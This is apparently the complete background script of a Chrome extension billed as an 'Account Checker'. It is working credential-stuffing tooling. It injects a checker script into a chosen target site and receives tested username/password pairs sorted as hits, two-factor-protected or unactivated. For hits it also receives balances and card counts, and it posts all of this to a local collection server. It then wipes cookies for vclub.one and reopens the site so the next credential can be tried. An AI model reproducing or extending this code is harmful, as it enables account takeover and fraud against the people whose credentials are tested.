// Background service worker for Account Checker Extension
let targetSite = '';
let isChecking = false;
let checkInterval = null;

// Listen for messages from popup and content scripts
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.type === '2fa_detected' || message.type === 'unactivated_detected' || message.type === 'hit_detected') {
        const { username, password } = message;
        let endpoint;
        let body = { username, password };

        if (message.type === '2fa_detected') {
            endpoint = 'report-2fa';
        } else if (message.type === 'unactivated_detected') {
            endpoint = 'report-unactivated';
        } else if (message.type === 'hit_detected') {
            endpoint = 'report-hit';
            body = {
                username,
                password,
                balance: message.balance,
                totalCCS: message.totalCCS,
                amounts: message.amounts,
                refunds: message.refunds
            };
        }

        // Report to local server
        fetch(`http://localhost:5050/${endpoint}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        })
        .then(response => response.json())
        .then(data => {
            console.log(`Reported ${message.type}:`, data);
        })
        .catch(error => {
            console.error(`Error reporting ${message.type}:`, error);
        });

        // Clear cookies for vclub.one
        chrome.cookies.getAll({ domain: 'vclub.one' }, (cookies) => {
            cookies.forEach(cookie => {
                const url = `https://${cookie.domain}${cookie.path}`;
                chrome.cookies.remove({ url, name: cookie.name });
            });
            console.log('Cleared cookies for vclub.one');

            // Open new tab with vclub.one
            chrome.tabs.create({ url: 'https://vclub.one/' }, (tab) => {
                console.log('Opened new tab:', tab.id);
                // Close the old tab
                chrome.tabs.remove(sender.tab.id, () => {
                    console.log('Closed old tab:', sender.tab.id);
                });
            });
        });
    }
});

// Load saved target site on startup
chrome.storage.local.get(['targetSite'], (result) => {
  if (result.targetSite) {
    targetSite = result.targetSite;
  }
});

// Monitor tab updates to detect when user navigates to target site
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && targetSite) {
    if (tab.url.includes(targetSite)) {
      // User is on target site, inject account checker script
      chrome.scripting.executeScript({
        target: { tabId: tabId },
        files: ['accountChecker.js']
      });
      
      // If checking is enabled, start checking on this tab
      if (isChecking) {
        chrome.tabs.sendMessage(tabId, { action: 'startChecking' });
      }
    }
  }
});

// Start account checking across all tabs
function startAccountChecking() {
  isChecking = true;
  chrome.storage.local.set({ isChecking: true });
  
  // Find all tabs with target site and start checking
  chrome.tabs.query({ url: `*://*${targetSite}/*` }, (tabs) => {
    tabs.forEach(tab => {
      chrome.tabs.sendMessage(tab.id, { action: 'startChecking' });
    });
  });
  
  // Set up interval to check for new tabs
  checkInterval = setInterval(() => {
    chrome.tabs.query({ url: `*://*${targetSite}/*` }, (tabs) => {
      tabs.forEach(tab => {
        chrome.tabs.sendMessage(tab.id, { action: 'startChecking' });
      });
    });
  }, 5000); // Check every 5 seconds
}

// Stop account checking
function stopAccountChecking() {
  isChecking = false;
  chrome.storage.local.set({ isChecking: false });
  
  if (checkInterval) {
    clearInterval(checkInterval);
    checkInterval = null;
  }
  
  // Stop checking on all tabs
  chrome.tabs.query({ url: `*://*${targetSite}/*` }, (tabs) => {
    tabs.forEach(tab => {
      chrome.tabs.sendMessage(tab.id, { action: 'stopChecking' });
    });
  });
}